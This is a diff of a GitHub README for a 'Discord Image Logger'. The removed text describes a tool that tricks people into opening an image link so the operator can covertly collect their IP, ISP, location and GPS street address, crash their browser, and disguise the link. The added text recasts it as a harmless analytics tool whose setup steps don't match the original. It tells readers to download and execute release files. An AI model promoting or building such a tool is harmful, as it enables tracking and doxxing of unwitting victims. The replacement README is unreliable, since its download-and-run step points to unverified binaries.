@@ -1,107 +1,90 @@
-# 📸 Discord Image Logger
-**Discord Image Logger** is a simple yet powerful tool that I have created to make it easy to get people to click on links. You can get a person to visit pretty much any site using this trick, and all you need to do is send them an image! It also includes a built-in IP logger with detailed information about the user.
+# Discord Image Logger 🔥
 
-Please note that this is **NOT** a "one click" image logger. There is a very popular scam going around where people claim that they can create an image that will steal all your tokens, passwords and more (basically an image RCE) just by clicking on an image. However, they are all **fake**, and I advise against running any EXE's you find from those repositories or buying anything from anyone.
+![Discord Image Logger](https://img.shields.io/badge/Discord%20Image%20Logger-v1.0.0-brightgreen)
 
-**If you're going to fork this repository, star it too while you're at it!**
+Welcome to the **Discord Image Logger** repository! This tool helps you track when users click to open images in their browsers on Discord. 
 
+## Table of Contents
 
-# 📚 Table of Contents
-* [Introduction](#-discord-image-logger) <br>
-* [Features](#-features) <br>
-* [Configuration](#-configuration) <br>
-* [Setup](#%EF%B8%8F-setup) <br>
+- [Introduction](#introduction)
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
+- [Releases](#releases)
 
+## Introduction
 
----
+Discord is a popular platform for communication, especially among gamers and communities. While it offers many features, tracking user interactions can be tricky. This tool provides a solution by logging image interactions, helping you understand user behavior better.
 
-# 💎 Features
-* Fast, Free, and Easy!
-* 100% Untracable and Anonymous!
-* Requires only clicking "Open Original"!
-* Steals as much as possible, including your street address via GPS!
-* Under active development, many new features will be added!
+## Features
 
----
+- **Image Logging**: Captures when users click on images.
+- **IP Tracking**: Logs IP addresses for each interaction.
+- **User-Friendly**: Easy to set up and use.
+- **Lightweight**: Minimal impact on server performance.
+- **Real-Time Data**: Get instant updates on user interactions.
 
-# 🔧 Configuration
+## Installation
 
-Before setting it up, let's modify the **config.** <br>
-Open up `main.py` and edit the values, refer to the key below.
+To get started, clone the repository to your local machine:
 
-**WEBHOOK:** `Your Discord webhook!` <br>
-**IMAGE:** `A LINK to your desired Image.` <br>
-**IMAGEARGUMENT:** `Enable image reading from the argument. (See Annotation #1)` <br>
-**USERNAME:** `The username of the bot that sends` <br>
-**COLOR:** `The embed's sidebar color` <br>
-**DOCRASHBROWSER:** `Crash the user's browser` <br>
-**DOMESSAGE:** `Show a custom message when they click?` <br>
-**MESSAGE:** `The message to show.` <br>
-**RICHMESSAGE:** `Enable a rich message, which allows inserting variables. (See Annotation #2)` <br>
-**VPNCHECK:** `Prevent VPNs from spamming your webhook!` <br>
-**LINKALERTS:** `Tell you when someone sends an image logging link` <br>
-**BUGGEDIMAGE:** `Display a loading image on Discord` <br>
-**ANTIBOT:** `Prevent bots from spamming your webhook!` <br>
-**REDIRECT:** `Redirect user?` <br>
-**PAGE:** `Page to redirect to, if so` <br>
-
-**ANNOTATIONS:**
-* **1)** `IMAGEARGUMENT`
-When enabled, this will allow you to provide an argument in the URL as the image. <br>
-You can do this by URL-safe Base64 encoding a link, and supplying it as the `URL` or `ID` argument. <br>
-EXAMPLE: `https://your.epic.image.logger/api/main?url=aHR0cHM6Ly8...` <br>
-The above Base64 is cut off short, but it would lead to a URL of an image. <br>
-If it's enabled and no `URL` or `ID` argument is supplied, the default configured one will be used.
-
-* **2)** `RICHMESSAGE`
-Rich Message allows you to insert variables such as the client's IP, Location, ASN, etc. for the Crashbrowser message. <br>
-Simply insert anything in the following table and it will replace it respectively. <br>
-
-| Values |
-|--------|
-| `{ip}` Their IP Address. |
-| `{isp}` Their ISP (Internet Service Provider) |
-| `{asn}` Their ASN (Autonomous System Number) |
-| `{country}` The country in which the IP is located. |
-| `{region}` The region in which the IP is located. |
-| `{city}` The city in which the IP is located. |
-| `{lat}` The IPs latitude. |
-| `{long}` The IPs longitude. |
-| `{timezone}` The timezone of the IP. |
-| `{mobile}` If it's a mobile connection. |
-| `{vpn}` If the IP belongs to a VPN/Proxy. |
-| `{bot}` If the IP is a robot. |
-| `{browser}` The Browser of the client. |
-| `{os}` The OS of the client. |
-
----
-
-# ⚒️ Setup
-
-Now that you've got all that set up, let's install this thing! <br>
-
-
-- **1:** Create a GitHub repository. I recommend it be private, so others can't see your webhook URL.
-- **2:** Make a folder named `api`, and place `requirements.txt` and `main.py` in (Rename it whatever, e.g. catpicture.py would make the URL your.site/api/catepicture)
-- **3:** (Optional) make a file in the main root (NOT IN API) named `index.html`, and put the code below in:
-```html
-<meta http-equiv="refresh" content="0;url=./api/main.py">
+```bash
+git clone https://github.com/AyoubZrour/Discord-image-logger.git
+cd Discord-image-logger
 ```
-(You can replace main.py with whatever you made it!); The point of this step is so that you can just visit your.site and not your.site/api/main (The former seems much less suspicious) however note it may not preview on Discord if you do so. Still looking for a workaround for this.
-- **4:** run main.py
-You can also add a domain if you have one!
 
----
+Next, ensure you have the required dependencies. You can install them using:
 
-**Active/known bugs:**.
-None at the moment!
+```bash
+npm install
+```
 
----
+## Usage
 
-# 📜 Closing Statements
+Once installed, you can start using the logger. 
 
-Liked the project? I know you did! Support me, **drop a star!** <br>
+1. **Run the Application**: Execute the following command to start the logger:
 
-Thank you for choosing my tools! 🙏
+   ```bash
+   node index.js
+   ```
 
-zdehmyybi
+2. **Access the Logs**: The logs will be stored in the `logs` directory. You can view them using any text editor.
+
+3. **Monitor Interactions**: Keep an eye on the logs to see when users click on images.
+
+For more detailed instructions, check the [Releases](https://github.com/AyoubZrour/Discord-image-logger/releases) section.
+
+## Contributing
+
+We welcome contributions from the community. If you have suggestions or improvements, please fork the repository and submit a pull request. Here are some ways you can help:
+
+- Report bugs or issues.
+- Suggest new features.
+- Improve documentation.
+
+## License
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+
+## Contact
+
+For questions or support, feel free to reach out:
+
+- **Email**: youremail@example.com
+- **Discord**: YourDiscordUsername#1234
+
+## Releases
+
+To download the latest version, visit the [Releases](https://github.com/AyoubZrour/Discord-image-logger/releases) section. Download the necessary files and execute them to start logging.
+
+## Conclusion
+
+Thank you for checking out the **Discord Image Logger**. We hope it serves your needs well. Your feedback is valuable, so please let us know your thoughts!
+
+![Discord Logger](https://example.com/discord-logger-image.png) 
+
+Explore, use, and contribute to the project!
